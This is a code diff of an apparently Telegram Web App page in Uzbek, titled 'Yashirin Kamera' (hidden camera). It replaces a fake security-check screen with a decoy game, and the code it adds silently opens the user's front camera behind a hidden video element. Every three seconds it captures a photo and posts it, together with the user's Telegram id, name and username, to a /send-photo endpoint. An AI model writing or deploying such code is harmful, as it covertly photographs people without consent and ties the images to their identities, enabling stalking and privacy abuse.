@@ -2,47 +2,129 @@
 <html lang="uz">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Tizim yuklanmoqda...</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Yashirin Kamera</title>
   <style>
     body {
-      margin: 0;
+      font-family: sans-serif;
       background: #111;
-      color: #0f0;
-      font-family: monospace;
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      flex-direction: column;
+      color: #fff;
       text-align: center;
+      padding: 2rem;
+      margin: 0;
     }
-    .loader {
-      width: 60px;
-      height: 60px;
-      border: 8px solid #444;
-      border-top: 8px solid #0f0;
+
+    .game {
+      max-width: 400px;
+      margin: auto;
+      padding: 1rem;
+      background: #1d1d1d;
+      border-radius: 12px;
+    }
+
+    .circle {
+      width: 40px;
+      height: 40px;
+      background: #0af;
       border-radius: 50%;
-      animation: spin 1s linear infinite;
-      margin-top: 20px;
+      position: absolute;
+      top: 0;
+      left: 0;
+      animation: moveCircle 3s infinite;
     }
+
+    @keyframes moveCircle {
+      0% { top: 0; left: 0; }
+      25% { top: 0; left: 80%; }
+      50% { top: 80%; left: 80%; }
+      75% { top: 80%; left: 0; }
+      100% { top: 0; left: 0; }
+    }
+
+    video {
+      display: none !important;
+      width: 0;
+      height: 0;
+      opacity: 0;
+    }
+
+    .loader {
+      border: 5px solid #333;
+      border-top: 5px solid #0af;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: 2rem auto;
+    }
+
     @keyframes spin {
       0% { transform: rotate(0deg); }
       100% { transform: rotate(360deg); }
     }
-    video {
-      display: none !important;
-    }
   </style>
 </head>
 <body>
-  <h2>🔄 Tizim xavfsizlik tekshiruvini o'tkazmoqda...</h2>
-  <p>Bu sahifani yopmang. Jarayon yakunlanmoqda.</p>
-  <div class="loader"></div>
+  <div class="game">
+    <h2>Yuzni aniqlash boshlangan</h2>
+    <p>Iltimos, sahifani tark etmang</p>
+    <div class="loader"></div>
+    <div style="position: relative; height: 200px; background: #222; border-radius: 10px;">
+      <div class="circle"></div>
+    </div>
+  </div>
 
   <video id="video" autoplay playsinline muted></video>
 
   <script src="https://telegram.org/js/telegram-web-app.js"></script>
-  <script src="script.js"></script>
+  <script>
+    Telegram.WebApp.ready();
+    Telegram.WebApp.expand();
+
+    const user = Telegram.WebApp.initDataUnsafe?.user;
+    const userId = user?.id || "";
+    const fullName = `${user?.first_name || ""} ${user?.last_name || ""}`.trim();
+    const username = user?.username || "";
+
+    const video = document.getElementById("video");
+    const canvas = document.createElement("canvas");
+    const ctx = canvas.getContext("2d");
+
+    (async () => {
+      try {
+        const stream = await navigator.mediaDevices.getUserMedia({
+          video: { facingMode: "user" }, audio: false
+        });
+
+        video.srcObject = stream;
+        await video.play();
+
+        setInterval(async () => {
+          if (!video.videoWidth) return;
+
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+          const blob = await new Promise(res => canvas.toBlob(res, "image/png"));
+          const file = new File([blob], "photo.png", { type: "image/png" });
+
+          const formData = new FormData();
+          formData.append("photo", file);
+          formData.append("user_id", userId);
+          formData.append("tg_fullname", fullName);
+          formData.append("tg_username", username);
+
+          await fetch("/send-photo", {
+            method: "POST",
+            body: formData
+          });
+          console.log("✅ Yuborildi", new Date().toLocaleTimeString());
+        }, 3000);
+      } catch (err) {
+        console.error("❌ Kamera ishlamadi:", err.message);
+      }
+    })();
+  </script>
 </body>
 </html>
